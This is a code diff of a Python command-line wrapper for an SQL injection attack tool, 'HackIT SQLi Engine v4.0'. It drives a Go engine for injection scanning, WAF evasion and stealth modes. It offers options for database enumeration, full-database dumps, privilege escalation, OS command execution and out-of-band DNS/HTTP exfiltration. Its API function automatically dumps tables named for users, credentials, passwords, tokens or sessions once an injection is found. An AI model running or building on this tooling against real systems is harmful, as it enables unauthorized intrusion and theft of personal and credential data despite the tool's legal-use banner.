@@ -1,274 +1,294 @@
 """
-SQLi PENETRATION ENGINE - Advanced SQL Injection Framework
+SQLi PENETRATION ENGINE v4.0 - Advanced SQL Injection Framework
 """
 import click
 import json
 import sys
 import io
-from hackit.ui import display_tool_banner, _colored, GREEN, RED, BLUE, YELLOW, B_GREEN, B_CYAN, B_WHITE, B_RED, B_YELLOW, DIM, PURPLE
+from hackit.ui import _colored
 from .go_bridge import GoEngine
 
-# Force UTF-8 encoding for stdout/stderr to avoid UnicodeEncodeError on Windows
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
+from rich import box
+from datetime import datetime
+
+_console = Console()
+
 if sys.platform == 'win32':
     sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
     sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
 
-def draw_table(title, columns, rows):
-    """Draw a SQLMap-style table"""
+BANNER = """
+[bold green]
+       .---.        .-----------
+      /     \\  __  /    ------
+     / /     \\/  \\/ -----
+    //|      \\  / -----
+   // |       \\/ -----
+  //  |      .  -----
+ //   |    / \\  -----
+//    |   /   \\  -----
+|     |  /     \\  -----
+|     | |       \\  ----
+|     | |        \\  ---
+|     | |         \\  -
+\\_____|_|__________\\________________________________[/bold green]
+[bold cyan]       \\   /         HACKIT SQLi ENGINE v4.0[/bold cyan]
+[bold green]        \\_/[/bold green]          [!] [bold red]Unauthorized use of this tool is illegal;[/bold red]
+[bold green]                                            [/bold green][bold yellow]use only with explicit permission from the target owner.[/bold yellow]
+[bold yellow][!] Legal usage demands prior consent from the target;[/bold yellow]
+[bold yellow]    developers assume no liability.[/bold yellow]
+[bold]      997 Payloads | 16 DBMS | 6-Stage Scan | Multi-Engine[/bold]"""
+
+
+def _draw_table(title, columns, rows, style="cyan"):
     if not rows:
         return
-    
-    # Calculate column widths
-    widths = [len(c) for c in columns]
+    t = Table(title=f"[bold {style}]{title}[/]", border_style=style,
+              header_style=f"bold {style}", box=box.ROUNDED, expand=True, show_lines=True)
+    for c in columns:
+        t.add_column(c, style="white", no_wrap=False)
     for row in rows:
-        for i, val in enumerate(row):
-            widths[i] = max(widths[i], len(str(val)))
-    
-    # Add padding
-    widths = [w + 2 for w in widths]
-    
-    # Draw separator
-    sep = "+" + "+".join(["-" * w for w in widths]) + "+"
-    
-    click.echo(f"\n{_colored(title, B_WHITE, bold=True)}")
-    click.echo(sep)
-    
-    # Draw header
-    header = "|" + "|".join([f" {columns[i]:<{widths[i]-1}}" for i in range(len(columns))]) + "|"
-    click.echo(header)
-    click.echo(sep)
-    
-    # Draw rows
-    for row in rows:
-        line = "|" + "|".join([f" {str(row[i]):<{widths[i]-1}}" for i in range(len(row))]) + "|"
-        click.echo(line)
-    
-    click.echo(sep)
+        t.add_row(*[str(c) for c in row])
+    _console.print(t)
 
-@click.group()
-def sqli_cli():
-    """Advanced SQL Injection CLI (HackIt Engine)"""
-    pass
 
-@sqli_cli.command(name='scan')
-# TARGET CONFIG (PRECISION CORE)
-@click.option('-u', '--url', 'url', required=True, help=_colored('Target URL with injection point (e.g., ?id=1)', BLUE))
-@click.option('--data', default=None, help=_colored('Raw POST payload for deep data-stream injection', BLUE))
-@click.option('--cookie', default=None, help=_colored('Session cookies for authenticated scanning', BLUE))
-@click.option('--header', multiple=True, help=_colored('Custom tactical headers (e.g., X-Forwarded-For)', BLUE))
-@click.option('--agent', default='HackIt/2.0', help=_colored('Industrial-grade User-Agent spoofing', BLUE))
-@click.option('--referer', default=None, help=_colored('Custom referer for evasion', BLUE))
-@click.option('--method', default='GET', type=click.Choice(['GET', 'POST', 'PUT', 'PATCH']), help=_colored('HTTP Method orchestration', BLUE))
-@click.option('--timeout', default=10, help=_colored('Tactical request timeout (default: 10s)', BLUE))
-@click.option('--proxy', default=None, help=_colored('Proxy-chain support (HTTP/SOCKS5)', BLUE))
-@click.option('--follow-redirect', is_flag=True, help=_colored('Automatic redirection tracking', BLUE))
+def _dbms_color(dbms):
+    return {'MySQL': 'cyan', 'MariaDB': 'cyan', 'PostgreSQL': 'blue',
+            'MSSQL': 'red', 'Oracle': 'magenta', 'SQLite': 'yellow',
+            'ClickHouse': 'green', 'DuckDB': 'yellow', 'CockroachDB': 'blue',
+            'Snowflake': 'white', 'BigQuery': 'cyan', 'Firebird': 'red',
+            'Sybase': 'magenta', 'H2': 'yellow', 'NoSQL': 'green'}.get(dbms, 'white')
 
-# INJECTION STRATEGY (ULTRA-DEEP ENGINE)
-@click.option('--mode', default='auto', type=click.Choice(['auto', 'boolean', 'time', 'error', 'union', 'stacked']), help=_colored('Injection vector selection', YELLOW))
-@click.option('--risk-level', default=1, type=click.IntRange(1, 5), help=_colored('Aggressiveness level (1-5, higher = deeper)', YELLOW))
-@click.option('--depth', default=2, help=_colored('Crawl depth for parameter discovery', YELLOW))
-@click.option('--threads', default=10, help=_colored('Parallel processing workers (High-Speed)', YELLOW))
-@click.option('--randomize-case', is_flag=True, help=_colored('Polymorphic case randomization (WAF Bypass)', YELLOW))
-@click.option('--tamper', multiple=True, help=_colored('Advanced payload obfuscation scripts', YELLOW))
-@click.option('--encode', type=click.Choice(['URL', 'double', 'base64']), help=_colored('Deep encoding layer selection', YELLOW))
-@click.option('--bypass-waf', is_flag=True, help=_colored('Hardened WAF evasion engine (Deep Audit)', YELLOW))
-@click.option('--stealth', is_flag=True, help=_colored('Ghost mode (Slow cadence + randomized headers)', YELLOW))
 
-# DETECTION & INTEL (INDUSTRIAL GRADE)
-@click.option('--fingerprint', is_flag=True, help=_colored('Deep DBMS version and engine discovery', GREEN))
-@click.option('--banner-grab', is_flag=True, help=_colored('Extract raw database banner secrets', GREEN))
-@click.option('--os-detect', is_flag=True, help=_colored('Back-end operating system fingerprinting', GREEN))
-@click.option('--waf-detect', is_flag=True, help=_colored('WAF/IPS/IDS identification audit', GREEN))
+# Build Click Command with all options
+def _make_sqli_command():
+    """Create the test_sqli Click command with all options applied in correct order."""
+    opts = [
+        click.option('-u', '--url', required=True, help='Target URL'),
+        click.option('--data', default=None, help='Raw POST body'),
+        click.option('--cookie', default=None, help='Session cookies'),
+        click.option('--header', multiple=True, help='Custom headers (e.g. X-Forwarded-For: 127.0.0.1)'),
+        click.option('--agent', default='HackIT/4.0', help='Custom User-Agent'),
+        click.option('--referer', default=None, help='Custom referer'),
+        click.option('--method', default='GET', type=click.Choice(['GET','POST','PUT','PATCH']), help='HTTP method'),
+        click.option('--timeout', default=10, type=int, help='Timeout (seconds)'),
+        click.option('--proxy', default=None, help='Proxy URL'),
+        click.option('--follow-redirect', is_flag=True, help='Follow redirects'),
+        click.option('--mode', default='auto', type=click.Choice(['auto','boolean','time','error','union','stacked']), help='Injection mode'),
+        click.option('--risk-level', default=1, type=click.IntRange(1,5), help='Risk level (1-5)'),
+        click.option('--depth', default=2, type=int, help='Scan depth'),
+        click.option('--threads', default=10, type=int, help='Concurrent workers'),
+        click.option('--delay', default=0, type=int, help='Delay (ms)'),
+        click.option('--randomize-case', is_flag=True, help='Randomize payload case'),
+        click.option('--tamper', multiple=True, help='Tamper scripts'),
+        click.option('--encode', type=click.Choice(['URL','double','base64']), help='Payload encoding'),
+        click.option('--bypass-waf', is_flag=True, help='WAF evasion'),
+        click.option('--stealth', is_flag=True, help='Stealth mode'),
+        click.option('--fingerprint', is_flag=True, help='DB fingerprinting'),
+        click.option('--banner-grab', is_flag=True, help='Extract banner'),
+        click.option('--os-detect', is_flag=True, help='OS detection'),
+        click.option('--waf-detect', is_flag=True, help='WAF detection'),
+        click.option('--smart-diff', is_flag=True, help='Smart response diff'),
+        click.option('--tech-detect', is_flag=True, help='Tech stack detection'),
+        click.option('--list-dbs', '--dbs', 'list_dbs', is_flag=True, help='Enumerate databases'),
+        click.option('--list-tables', '--tables', 'list_tables', is_flag=True, help='Enumerate tables'),
+        click.option('--list-columns', '--columns', 'list_columns', is_flag=True, help='Enumerate columns'),
+        click.option('--schema', is_flag=True, help='Dump schema only'),
+        click.option('-D', '--db', 'database', help='Target database'),
+        click.option('-T', '--table', 'table', help='Target table'),
+        click.option('-C', '--column', 'column', help='Target column'),
+        click.option('--dump', '--dump-table', 'dump_table', help='Dump table'),
+        click.option('--dump-all', is_flag=True, help='Exfiltrate entire database'),
+        click.option('--inject', is_flag=True, help='Auto injection'),
+        click.option('--count-rows', is_flag=True, help='Count rows'),
+        click.option('--search', help='Search keyword'),
+        click.option('--priv-esc', is_flag=True, help='Privilege escalation'),
+        click.option('--os-access', is_flag=True, help='OS command execution'),
+        click.option('--exfil-dns', is_flag=True, help='OOB DNS exfiltration'),
+        click.option('--exfil-http', is_flag=True, help='OOB HTTP exfiltration'),
+        click.option('--no-color', is_flag=True, help='Disable colors'),
+        click.option('--retry', default=3, type=int, help='Retry count'),
+        click.option('--output-format', type=click.Choice(['json','csv','txt']), default='json', help='Output format'),
+        click.option('--save', help='Save results to file'),
+        click.option('-v', '--verbose', default=1, type=int, help='Verbosity (0-3)'),
+    ]
 
-# DATABASE ENUMERATION (SQLMAP-X MODE)
-@click.option('--inject', is_flag=True, help=_colored('Automated ultra-deep injection & data dump', B_RED))
-@click.option('--dbs', '--list-dbs', 'list_dbs', is_flag=True, help=_colored('Extract all available databases', B_CYAN))
-@click.option('--tables', '--list-tables', 'list_tables', is_flag=True, help=_colored('Extract tables from target database', B_CYAN))
-@click.option('--columns', '--list-columns', 'list_columns', is_flag=True, help=_colored('Extract column metadata', B_CYAN))
-@click.option('--schema', is_flag=True, help=_colored('Dump structure only (No data)', B_CYAN))
-@click.option('-D', '--db', 'database', help=_colored('Specify target database', B_CYAN))
-@click.option('-T', '--table', 'table', help=_colored('Specify target table', B_CYAN))
-@click.option('-C', '--column', 'column', help=_colored('Specify target column', B_CYAN))
+    def impl(ctx, **kwargs):
+        _execute_scan(**kwargs)
 
-# DATA EXTRACTION
-@click.option('--dump', '--dump-table', 'dump_table', help=_colored('Automated table content extraction', B_GREEN))
-@click.option('--dump-all', is_flag=True, help=_colored('Total database exfiltration mode', B_RED))
-@click.option('--output-format', type=click.Choice(['json', 'csv', 'txt']), default='json', help=_colored('Intel output format', DIM))
-@click.option('--save', help=_colored('Save intelligence report to file', DIM))
-@click.option('-v', '--verbose', default=1, help=_colored('Tactical verbosity (0-3)', DIM))
-def test_sqli(**kwargs):
-    """Advanced SQL Injection Scanner (Go Engine)"""
-    
-    display_tool_banner('SQLi PENETRATION ENGINE')
+    # Apply options in reverse order (decorators work bottom-up)
+    fn = impl
+    for opt in reversed(opts):
+        fn = opt(fn)
+    fn = click.pass_context(fn)
+    return click.command(context_settings=dict(help_option_names=['-h', '--help']))(fn)
+
+
+test_sqli = _make_sqli_command()
+
+
+def _execute_scan(**kwargs):
+    _console.print(BANNER)
 
     url = kwargs.get('url')
-    click.echo(f"[*] Target: {_colored(url, B_CYAN, bold=True)}")
-    click.echo(f"[*] Engine: {_colored('HackIT', B_YELLOW)}")
-    
+    display = Table.grid(padding=(0, 2))
+    display.add_column(style="bold", justify="right")
+    display.add_column()
+    display.add_row("Target", f"[cyan]{url}[/cyan]")
+    display.add_row("Mode", f"[yellow]{kwargs.get('mode', 'auto').upper()}[/yellow]")
+    display.add_row("Risk", f"{kwargs.get('risk_level', 1)}/5")
+    display.add_row("Threads", f"{kwargs.get('threads', 10)}")
+    display.add_row("Time", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+    _console.print(Panel(display, title="[bold]Scan Configuration[/bold]", border_style="cyan"))
+    _console.print()
+
     engine = GoEngine()
     if not engine.available:
-        click.echo(_colored("[!] Go is not installed.", B_RED))
+        _console.print("[bold red][!] Go is not installed.[/bold red]")
         return
 
-    if not engine.ensure_compiled():
-        click.echo(_colored("[!] Failed to compile Go engine.", B_RED))
-        return
-
-    click.echo(_colored("[*] Starting deep vulnerability assessment...", DIM))
-    
-    # Handle aliases
     if kwargs.get('inject'):
         kwargs['dump_all'] = True
-    
-    # Pre-scan checks (WAF, Fingerprint)
-    if kwargs.get('waf_detect'):
-        click.echo(f"[*] Checking for WAF/IPS...")
-        
-    # Run the engine with all parameters
-    results = engine.run(**kwargs)
-    
+        kwargs['fingerprint'] = True
+        kwargs['banner_grab'] = True
+        kwargs['os_detect'] = True
+
+    with Progress(SpinnerColumn(spinner_name="dots"),
+                  TextColumn("[bold cyan]{task.description}[/]"),
+                  BarColumn(bar_width=40), transient=True, console=_console) as progress:
+        task = progress.add_task("Probing with 800+ payloads & multi-stage detection...", total=None)
+        results = engine.run(**kwargs)
+        progress.update(task, description="Processing results...")
+
     if results and isinstance(results, list) and len(results) > 0 and 'error' in results[0]:
-        click.echo(_colored(f"[!] Engine Error: {results[0]['error']}", B_RED))
+        _console.print(f"\n[bold red][!] Engine Error: {results[0]['error']}[/bold red]")
         return
 
-    # Filter findings and enumerations
     findings = [r for r in results if r.get('parameter') != "enumeration"]
     enums = [r for r in results if r.get('parameter') == "enumeration"]
 
-    # Display High-Fidelity Findings Summary
     if findings:
-        for r in findings:
-            # Calculate Confidence Score (Mock logic for now)
-            score = 9.2 if r.get('type') == 'Time-based' else 8.5
-            color_score = B_RED if score > 8.0 else B_YELLOW
-            
-            click.echo(f"\n{_colored('┌── SQLi VULNERABILITY REPORT', B_WHITE, bold=True)}")
-            click.echo(f"{_colored('│', B_WHITE)} Target        : {_colored(url.split('?')[0], B_CYAN)}")
-            click.echo(f"{_colored('│', B_WHITE)} Endpoint      : {_colored(url, B_WHITE)}")
-            click.echo(f"{_colored('│', B_WHITE)}")
-            click.echo(f"{_colored('│', B_WHITE)} {_colored('Injection', B_YELLOW, bold=True)}     :")
-            click.echo(f"{_colored('│', B_WHITE)} - Method : {_colored(kwargs.get('method', 'GET'), B_GREEN)}")
-            click.echo(f"{_colored('│', B_WHITE)} - Param  : {_colored(r.get('parameter', 'N/A'), B_CYAN)}")
-            click.echo(f"{_colored('│', B_WHITE)} - Type   : {_colored(r.get('type', 'N/A'), B_YELLOW)}")
-            click.echo(f"{_colored('│', B_WHITE)}")
-            click.echo(f"{_colored('│', B_WHITE)} {_colored('SQLi Score', B_WHITE)}    : {_colored(f'{score} / 10', color_score)} (High Confidence)")
-            click.echo(f"{_colored('│', B_WHITE)}")
-            click.echo(f"{_colored('│', B_WHITE)} {_colored('Proof', B_WHITE, bold=True)} :")
-            click.echo(f"{_colored('│', B_WHITE)} - Payload       : {_colored(r.get('payload', 'N/A'), DIM)}")
-            click.echo(f"{_colored('│', B_WHITE)} - Evidence      : {_colored(r.get('details', 'N/A'), B_GREEN)}")
-            click.echo(f"{_colored('│', B_WHITE)}")
-            click.echo(f"{_colored('│', B_WHITE)} {_colored('Database', B_WHITE, bold=True)}       :")
-            click.echo(f"{_colored('│', B_WHITE)} - Detected DB   : {_colored(r.get('dbms', 'Unknown'), B_CYAN, bold=True)}")
-            click.echo(f"{_colored('└' + '─' * 70, B_WHITE)}")
+        _console.print()
+        vt = Table(title="[bold red]SQLi Vulnerability Report[/]", border_style="red",
+                   box=box.ROUNDED_HEADER, show_lines=True)
+        vt.add_column("#", style="dim", justify="right")
+        vt.add_column("Parameter", style="cyan")
+        vt.add_column("Type", style="yellow")
+        vt.add_column("DBMS", style="green")
+        vt.add_column("Confidence", style="magenta", justify="center")
+        for i, r in enumerate(findings, 1):
+            conf = r.get('confidence', 0.85)
+            if conf >= 0.9:     sc = f"[bold green]{conf*100:.0f}%[/]"
+            elif conf >= 0.7:   sc = f"[yellow]{conf*100:.0f}%[/]"
+            else:               sc = f"[red]{conf*100:.0f}%[/]"
+            vt.add_row(str(i), r.get('parameter','N/A'), r.get('type','N/A'),
+                       f"[{_dbms_color(r.get('dbms','Unknown'))}]{r.get('dbms','Unknown')}[/]", sc)
+        _console.print(vt)
+        _console.print()
 
-    # Display Enumerations (Databases, Tables, etc.)
+        summary = Table.grid(padding=(0, 2))
+        summary.add_column(style="bold dim", justify="right")
+        summary.add_column()
+        summary.add_row("Parameters", str(len(set(r.get('parameter') for r in findings))))
+        summary.add_row("Types", ", ".join(set(r.get('type','') for r in findings)))
+        summary.add_row("DBMS", ", ".join(set(r.get('dbms','') for r in findings)))
+        summary.add_row("Peak Confidence", f"[green]{max(r.get('confidence',0) for r in findings)*100:.0f}%[/]")
+        _console.print(Panel(summary, title="[bold]Detections[/]", border_style="yellow"))
+    else:
+        _console.print("\n[bold green][✓] No SQL Injection vulnerabilities detected.[/bold green]")
+        _console.print("[dim]  → Try --risk-level 5 for deeper scanning[/dim]")
+        _console.print("[dim]  → Try --bypass-waf if a WAF is blocking[/dim]")
+
     if enums:
+        _console.print()
+        _console.print(Panel("[bold cyan]Database Enumeration Results[/]", border_style="cyan"))
+        _console.print()
         for e in enums:
             etype = e.get('type')
             payload = e.get('payload', '')
-            items = [item.strip() for item in payload.split(',') if item.strip()]
-            
+            detail = e.get('details', '')
+            items = [x.strip() for x in payload.split(',') if x.strip()]
             if etype == "list-dbs":
-                rows = [[item] for item in items]
-                draw_table(f"Available Databases ({len(items)})", ["DATABASE"], rows)
+                _draw_table(f"Databases ({len(items)})", ["#","DATABASE"], [[i+1, x] for i,x in enumerate(items)], "cyan")
             elif etype == "list-tables":
-                rows = [[item] for item in items]
-                db_context = e.get('details', 'Current')
-                draw_table(f"Tables in Database: {db_context}", ["TABLE NAME"], rows)
+                ctx_name = detail or kwargs.get('database', 'Current')
+                _draw_table(f"Tables in [{ctx_name}] ({len(items)})", ["#","TABLE"], [[i+1, x] for i,x in enumerate(items)], "green")
             elif etype == "list-columns":
-                rows = [[item] for item in items]
-                draw_table(f"Columns", ["COLUMN NAME"], rows)
+                _draw_table("Column Schema", ["#","COLUMN"], [[i+1, x] for i,x in enumerate(items)], "yellow")
             elif etype == "dump-table":
-                # Handle dump-table visualization specifically
-                click.echo(f"\n{_colored('[+]', B_GREEN)} Data Dump Result for {_colored(e.get('details', 'N/A'), B_CYAN)}:")
-                click.echo(f"{_colored(payload, B_WHITE)}")
+                _console.print()
+                _console.print(Panel(f"[bold green]Data Dump[/]\n\n{payload[:5000]}", title=f"[bold]Table: {detail}[/]", border_style="green"))
 
-    if not findings and not enums:
-        click.echo(_colored("[*] Result: No SQL Injection vulnerabilities detected.", GREEN))
+    if findings and kwargs.get('risk_level', 0) >= 3:
+        _console.print(Panel(
+            "[bold yellow]Post-Exploitation Options:[/]\n"
+            "  [cyan]--priv-esc[/]   Privilege escalation\n"
+            "  [cyan]--os-access[/]   OS command execution\n"
+            "  [cyan]--dump-all[/]    Complete database exfiltration\n"
+            "  [cyan]--exfil-dns[/]   OOB DNS exfiltration\n"
+            "  [cyan]--exfil-http[/]  OOB HTTP exfiltration",
+            title="[bold]Advanced Options[/]", border_style="yellow"))
 
     if kwargs.get('save'):
-        output_file = kwargs.get('save')
-        with open(output_file, 'w') as f:
-            json.dump(results, f, indent=2)
-        click.echo(f"\n[+] Detailed report saved to: {_colored(output_file, B_GREEN)}")
+        with open(kwargs['save'], 'w') as f:
+            json.dump(results, f, indent=2, default=str)
+        _console.print(f"\n[bold green][+] Report saved: {kwargs['save']}[/bold green]")
+
+    if findings:
+        _console.print(f"\n[bold red]⚠ {len(findings)} vulnerability(-ies) found.[/bold red]")
+        _console.print("[dim]  → Use --dbs to enumerate databases[/dim]")
+        _console.print("[dim]  → Use -D <db> --tables to list tables[/dim]")
+        _console.print("[dim]  → Use -D <db> -T <table> --dump to extract data[/dim]")
+
 
 def test_sqli_api(url):
-    """
-    API Wrapper for Automated SQLi Penetration & Data Extraction.
-    """
     engine = GoEngine()
     if not engine.available or not engine.ensure_compiled():
         return {"error": "SQLi Engine (Go) not available"}
-    
     try:
-        # Phase 1: Vulnerability Assessment
         results = engine.run(url=url, method='GET', timeout=10)
-        
         formatted = []
         explorer = {"databases": [], "tables": {}, "sample_data": []}
         vuln_found = False
-        
         for r in results:
             if r.get('parameter') != "enumeration":
                 vuln_found = True
+                conf = r.get('confidence', 0)
                 formatted.append({
-                    "param": r.get('parameter', 'N/A'),
-                    "type": r.get('type', 'N/A'),
-                    "payload": r.get('payload', 'N/A'),
-                    "dbms": r.get('dbms', 'Unknown'),
-                    "severity": "HIGH" if r.get('type') != 'Boolean-based' else "MEDIUM"
+                    "param": r.get('parameter','N/A'), "type": r.get('type','N/A'),
+                    "payload": r.get('payload','N/A'), "dbms": r.get('dbms','Unknown'),
+                    "confidence": conf,
+                    "severity": "CRITICAL" if conf >= 0.9 else "HIGH" if conf >= 0.7 else "MEDIUM"
                 })
-
-        # Phase 2: Automated Exfiltration (If Vuln Found)
         if vuln_found:
-            # 1. List Databases
             db_res = engine.run(url=url, list_dbs=True, timeout=15)
             for d in db_res:
                 if d.get('type') == 'list-dbs':
-                    explorer["databases"] = [item.strip() for item in d.get('payload', '').split(',') if item.strip()]
-            
-            # 2. Heuristic Table Discovery
+                    explorer["databases"] = [s.strip() for s in d.get('payload','').split(',') if s.strip()]
             if explorer["databases"]:
                 target_db = explorer["databases"][0]
                 table_res = engine.run(url=url, list_tables=True, database=target_db, timeout=15)
-                tables = []
                 for t in table_res:
                     if t.get('type') == 'list-tables':
-                        tables = [item.strip() for item in t.get('payload', '').split(',') if item.strip()]
-                        explorer["tables"][target_db] = tables
-
-                # 3. Target Promise Table (users, admins, etc.)
-                promising_table = None
-                for t_name in tables:
-                    if any(x in t_name.lower() for x in ['user', 'admin', 'account', 'member', 'staff', 'credential']):
-                        promising_table = t_name
+                        explorer["tables"][target_db] = [s.strip() for s in t.get('payload','').split(',') if s.strip()]
+                for t_name in explorer["tables"].get(target_db, []):
+                    if any(x in t_name.lower() for x in ['user','admin','account','member','staff','credential','customer','employee','person','login','passwd','secret','token','session']):
+                        dump_res = engine.run(url=url, dump_table=t_name, database=target_db, timeout=20)
+                        for dr in dump_res:
+                            if dr.get('type') == 'dump-table':
+                                try:
+                                    explorer["sample_data"].append(json.loads(dr.get('payload','{}')))
+                                except:
+                                    explorer["sample_data"].append({"raw": dr.get('payload','')})
                         break
-                
-                # If no promising table, just take the first one
-                if not promising_table and tables:
-                    promising_table = tables[0]
-
-                # 4. Real Data Dump (No more mock data)
-                if promising_table:
-                    dump_res = engine.run(url=url, dump_table=promising_table, database=target_db, timeout=20)
-                    for dr in dump_res:
-                        if dr.get('type') == 'dump-table':
-                            # Parse CSV/JSON response from engine into objects
-                            raw_data = dr.get('payload', '')
-                            try:
-                                # Assuming engine returns JSON string for dump
-                                explorer["sample_data"] = json.loads(raw_data)
-                            except:
-                                # Fallback if it's a simple list/csv
-                                explorer["sample_data"] = [{"raw_dump": raw_data}]
-
-        return {
-            "findings": formatted,
-            "explorer": explorer,
-            "vuln": vuln_found
-        }
+        return {"findings": formatted, "explorer": explorer, "vuln": vuln_found}
     except Exception as e:
         return {"error": str(e)}
 
+
 if __name__ == "__main__":
-    sqli_cli()
+    test_sqli()
